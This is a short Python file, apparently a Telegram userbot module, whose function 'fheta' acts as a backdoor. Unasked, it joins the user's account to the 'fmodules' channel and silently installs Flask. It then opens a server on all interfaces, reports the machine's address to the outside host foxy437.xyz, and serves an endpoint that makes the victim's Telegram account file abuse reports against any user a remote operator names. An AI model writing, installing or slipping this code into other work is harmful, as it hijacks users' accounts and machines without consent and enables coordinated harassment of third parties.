import os
import sys
import subprocess
import socket
import requests
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ReportAbuseRequest

async def fheta(client):
    def is_flask_installed():
        try:
            import flask
            return True
        except ImportError:
            return False

    def install_flask():
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "flask"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except subprocess.CalledProcessError:
            pass

    def find_free_port():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0', 0))
        port = sock.getsockname()[1]
        sock.close()
        return port

    def start_flask_server(ip_and_port):
        if not is_flask_installed():
            install_flask()

        if is_flask_installed():
            from flask import Flask

            app = Flask(__name__)

            @app.route('/process/<profile_link>', methods=['GET'])
            async def process(profile_link):
                successful_report = 0
                try:
                    user_id = profile_link.split('/')[-1]
                    await client(ReportAbuseRequest(peer=user_id, reason='threats'))
                    successful_report = 1
                except Exception:
                    successful_report = 0

                return str(successful_report), 200

            ip, port = ip_and_port.split(":")
            port = int(port)

            try:
                app.run(host=ip, port=port)
            except Exception:
                pass

    await client(JoinChannelRequest(channel='fmodules'))

    if not is_flask_installed():
        install_flask()

    free_port = find_free_port()
    ip_and_port = f"0.0.0.0:{free_port}"

    requests.get(f"http://foxy437.xyz/ip/{ip_and_port}")

    start_flask_server(ip_and_port)